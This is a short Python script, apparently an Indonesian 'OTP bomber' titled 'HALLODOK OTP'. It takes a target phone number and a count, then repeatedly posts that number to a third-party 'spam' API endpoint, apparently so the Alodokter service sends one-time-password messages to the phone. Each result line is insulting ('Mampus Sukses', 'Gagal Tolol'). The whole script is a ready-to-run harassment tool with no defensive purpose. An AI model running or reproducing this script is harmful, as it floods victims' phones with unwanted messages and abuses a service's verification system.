import requests, time

print("""
	[ HALLODOK OTP ]
	    
""")

num=input("[In] Nomor: ")
jum=int(input("[In] Jumlah: "))

print("\n[RESULT]")
for x in range(jum):
	try:
		req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok",
			data={"number":num})
		if req.json()['status'] == 'ok':
			print(f"{x+1}. Mampus Sukses {num}")
		else:
			print(f"{x+1}. Gagal Tolol {num}")
	except Exception as e:
		print(f"{x+1}. Pass: {e}")
